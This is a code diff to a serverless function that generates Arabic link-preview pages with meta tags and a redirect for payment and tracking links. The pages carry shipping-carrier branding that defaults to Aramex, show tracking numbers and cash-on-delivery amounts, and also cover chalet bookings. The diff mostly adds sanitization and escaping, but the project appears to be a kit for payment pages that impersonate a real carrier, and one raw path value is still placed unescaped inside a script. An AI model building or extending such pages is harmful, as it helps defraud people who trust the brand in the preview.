@@ -87,6 +87,82 @@ const serviceData = {
   }
 };
 
+const stripNonAlphanumeric = (value = "") => value.replace(/[^a-z0-9]/gi, "");
+
+const knownServiceKeys = Object.keys(serviceData);
+
+const matchCondensedKey = (value = "") => {
+  const condensedValue = stripNonAlphanumeric(value.toLowerCase());
+
+  return knownServiceKeys.find((key) => {
+    const condensedKey = stripNonAlphanumeric(key.toLowerCase());
+    return condensedValue === condensedKey || condensedValue.includes(condensedKey);
+  });
+};
+
+const normalizeServiceKey = (rawKey, fallbackName) => {
+  if (rawKey) {
+    const normalizedKey = rawKey.toString().trim().toLowerCase();
+
+    if (knownServiceKeys.includes(normalizedKey)) {
+      return normalizedKey;
+    }
+
+    const matchedKey = matchCondensedKey(normalizedKey);
+    if (matchedKey) {
+      return matchedKey;
+    }
+  }
+
+  if (fallbackName) {
+    const normalizedName = fallbackName.toString().trim().toLowerCase();
+    const matchedKey = matchCondensedKey(normalizedName);
+
+    if (matchedKey) {
+      return matchedKey;
+    }
+
+    const englishSegment = fallbackName.toString().split("-").pop();
+    if (englishSegment) {
+      const matchedFromSegment = matchCondensedKey(englishSegment.trim().toLowerCase());
+      if (matchedFromSegment) {
+        return matchedFromSegment;
+      }
+    }
+  }
+
+  return "aramex";
+};
+
+const sanitizeText = (value, fallback = "", maxLength = 200) => {
+  const normalize = (input = "") => input
+    .toString()
+    .replace(/[<>"\n\r\t]+/g, " ")
+    .replace(/\s+/g, " ")
+    .trim();
+
+  const sanitizedFallback = normalize(fallback);
+
+  if (!value) {
+    return sanitizedFallback.slice(0, maxLength);
+  }
+
+  const sanitizedValue = normalize(value);
+
+  if (!sanitizedValue) {
+    return sanitizedFallback.slice(0, maxLength);
+  }
+
+  return sanitizedValue.slice(0, maxLength);
+};
+
+const escapeHtmlAttr = (value = "") => value
+  .replace(/&/g, "&amp;")
+  .replace(/"/g, "&quot;")
+  .replace(/'/g, "&#39;")
+  .replace(/</g, "&lt;")
+  .replace(/>/g, "&gt;");
+
 // Country data mapping
 const countryData = {
   AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
@@ -156,7 +232,7 @@ exports.handler = async (event, context) => {
     }
   }
   
-  const country = countryData[countryCode];
+  let country = countryData[countryCode];
   
   if (!country) {
     return {
@@ -187,70 +263,94 @@ exports.handler = async (event, context) => {
   console.log('Query Parameters:', queryStringParameters);
   console.log('Final Country:', countryCode, 'Type:', type);
   
-  let title = "";
-  let description = "";
-  let ogImage = "/og-aramex.jpg";
-  let serviceKey = 'aramex'; // fallback
-  
+  let titleText = "";
+  let descriptionText = "";
+  let ogImagePath = "/og-aramex.jpg";
+  let serviceKey = 'aramex';
+
   if (type === "shipping") {
-    // Determine service key from multiple sources
-    if (linkData?.payload?.service_key) {
-      serviceKey = linkData.payload.service_key;
-      console.log('Using service_key from payload:', serviceKey);
-    } else if (linkData?.payload?.service) {
-      serviceKey = linkData.payload.service;
-      console.log('Using service from payload:', serviceKey);
-    } else if (queryStringParameters?.service) {
-      serviceKey = queryStringParameters.service;
-      console.log('Using service from query params:', serviceKey);
-    } else {
-      console.log('Using fallback service:', serviceKey);
-    }
-    
+    const rawServiceKeyCandidates = [
+      linkData?.payload?.service_key,
+      linkData?.payload?.service,
+      queryStringParameters?.service,
+    ];
+
+    const serviceNameCandidate = linkData?.payload?.service_name;
+    const primaryCandidate = rawServiceKeyCandidates.find(
+      (candidate) => typeof candidate === "string" && candidate.trim().length > 0
+    );
+
+    serviceKey = normalizeServiceKey(primaryCandidate, serviceNameCandidate);
+    console.log('Normalized service key:', serviceKey);
+
     const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
-    
-    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
-    
-    // Determine if this is a payment page or microsite
+    const safeServiceName = sanitizeText(serviceNameCandidate, serviceInfo.name, 120);
+    const serviceDescription = sanitizeText(serviceInfo.description, serviceData.aramex.description, 160);
+
     const isPaymentPage = path.startsWith('/pay/');
     const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
-    
-    title = `${pageType} - ${serviceName}`;
-    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
-    ogImage = serviceInfo.ogImage;
-    
-    // Add tracking number to description if available
-    if (linkData?.payload?.tracking_number) {
-      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
+
+    const descriptionSegments = [
+      serviceDescription,
+      isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'
+    ];
+
+    const trackingNumber = sanitizeText(linkData?.payload?.tracking_number, '', 60);
+    if (trackingNumber) {
+      descriptionSegments.push(`رقم الشحنة: ${trackingNumber}`);
     }
-    
-    // Add COD amount if available
-    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
-      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
+
+    const codAmount = Number(linkData?.payload?.cod_amount);
+    if (Number.isFinite(codAmount) && codAmount > 0) {
+      descriptionSegments.push(`مبلغ الدفع: ${codAmount} ر.س`);
     }
+
+    titleText = `${pageType} - ${safeServiceName}`;
+    descriptionText = descriptionSegments.filter(Boolean).join(' - ');
+    ogImagePath = serviceInfo.ogImage || "/og-aramex.jpg";
   } else if (type === "chalet") {
-    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
+    const chaletName = sanitizeText(linkData?.payload?.chalet_name, 'شاليه', 120);
     const isPaymentPage = path.startsWith('/pay/');
     const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
-    
-    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
-    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
-    
-    // Add guest count and nights if available
-    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
-      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
+    const safeCountryName = sanitizeText(country?.nameAr, 'المملكة العربية السعودية', 120);
+
+    titleText = `${pageType} - ${chaletName} في ${safeCountryName}`;
+
+    const descriptionSegments = [
+      `احجز ${chaletName} في ${safeCountryName}`,
+      isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'
+    ];
+
+    const guestCount = Number(linkData?.payload?.guest_count);
+    const nights = Number(linkData?.payload?.nights);
+
+    if (Number.isFinite(guestCount) && Number.isFinite(nights) && guestCount > 0 && nights > 0) {
+      descriptionSegments.push(`${guestCount} ضيف لـ ${nights} ليلة`);
     }
-    
-    ogImage = "/og-aramex.jpg"; // Default for chalets
+
+    descriptionText = descriptionSegments.filter(Boolean).join(' - ');
+    ogImagePath = "/og-aramex.jpg";
+  } else {
+    titleText = 'نظام الدفع الآمن';
+    descriptionText = sanitizeText(serviceData.aramex.description, 'نظام دفع آمن ومحمي', 200);
+    ogImagePath = "/og-aramex.jpg";
   }
-  
+
+  const safeTitleText = sanitizeText(titleText, 'نظام الدفع الآمن', 140);
+  const safeDescriptionText = sanitizeText(descriptionText, serviceData.aramex.description, 220);
+
   const siteUrl = `https://${event.headers.host}`;
   const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
-  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
-  
+  const fullOgImage = ogImagePath && ogImagePath.startsWith('http') ? ogImagePath : `${siteUrl}${ogImagePath}`;
+
+  const metaTitle = escapeHtmlAttr(safeTitleText);
+  const metaDescription = escapeHtmlAttr(safeDescriptionText);
+  const metaFullUrl = escapeHtmlAttr(fullUrl);
+  const metaOgImage = escapeHtmlAttr(fullOgImage);
+  const redirectUrlJson = JSON.stringify(fullUrl);
+
   // Final debug logging
-  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
+  console.log('Final meta tags:', { title: safeTitleText, description: safeDescriptionText, ogImage: ogImagePath, serviceKey });
   
   // Generate HTML with proper meta tags
   const html = `<!DOCTYPE html>
@@ -261,16 +361,16 @@ exports.handler = async (event, context) => {
   <meta name="theme-color" content="#0EA5E9" />
   
   <!-- Basic Meta Tags -->
-  <title>${title}</title>
-  <meta name="description" content="${description}" />
+  <title>${metaTitle}</title>
+  <meta name="description" content="${metaDescription}" />
   <meta name="author" content="منصة الشحن الذكية" />
   
   <!-- Open Graph / Facebook / WhatsApp -->
   <meta property="og:type" content="website" />
-  <meta property="og:url" content="${fullUrl}" />
-  <meta property="og:title" content="${title}" />
-  <meta property="og:description" content="${description}" />
-  <meta property="og:image" content="${fullOgImage}" />
+  <meta property="og:url" content="${metaFullUrl}" />
+  <meta property="og:title" content="${metaTitle}" />
+  <meta property="og:description" content="${metaDescription}" />
+  <meta property="og:image" content="${metaOgImage}" />
   <meta property="og:image:width" content="1200" />
   <meta property="og:image:height" content="630" />
   <meta property="og:image:type" content="image/jpeg" />
@@ -279,16 +379,16 @@ exports.handler = async (event, context) => {
   
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:url" content="${fullUrl}" />
-  <meta name="twitter:title" content="${title}" />
-  <meta name="twitter:description" content="${description}" />
-  <meta name="twitter:image" content="${fullOgImage}" />
-  <meta name="twitter:image:alt" content="${title}" />
+  <meta name="twitter:url" content="${metaFullUrl}" />
+  <meta name="twitter:title" content="${metaTitle}" />
+  <meta name="twitter:description" content="${metaDescription}" />
+  <meta name="twitter:image" content="${metaOgImage}" />
+  <meta name="twitter:image:alt" content="${metaTitle}" />
   
   <!-- Additional SEO -->
   <meta name="robots" content="index, follow" />
   <meta name="language" content="Arabic" />
-  <link rel="canonical" href="${fullUrl}" />
+  <link rel="canonical" href="${metaFullUrl}" />
   
   <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -327,8 +427,8 @@ exports.handler = async (event, context) => {
 <body>
   <div class="loading">
     <div class="meta-info">
-      <h1 style="font-size: 2rem; margin-bottom: 1rem;">${title}</h1>
-      <p style="font-size: 1.2rem; margin-bottom: 1rem;">${description}</p>
+      <h1 style="font-size: 2rem; margin-bottom: 1rem;">${metaTitle}</h1>
+      <p style="font-size: 1.2rem; margin-bottom: 1rem;">${metaDescription}</p>
       <p style="font-size: 0.9rem; opacity: 0.8;">جاري التحميل...</p>
     </div>
   </div>
@@ -338,10 +438,10 @@ exports.handler = async (event, context) => {
     setTimeout(() => {
       // For payment pages, redirect to the actual React app
       if ('${path}'.startsWith('/pay/')) {
-        window.location.href = '${fullUrl}';
+        window.location.href = ${redirectUrlJson};
       } else {
         // For microsite pages, redirect to the actual React app
-        window.location.href = '${fullUrl}';
+        window.location.href = ${redirectUrlJson};
       }
     }, 2000);
   </script>
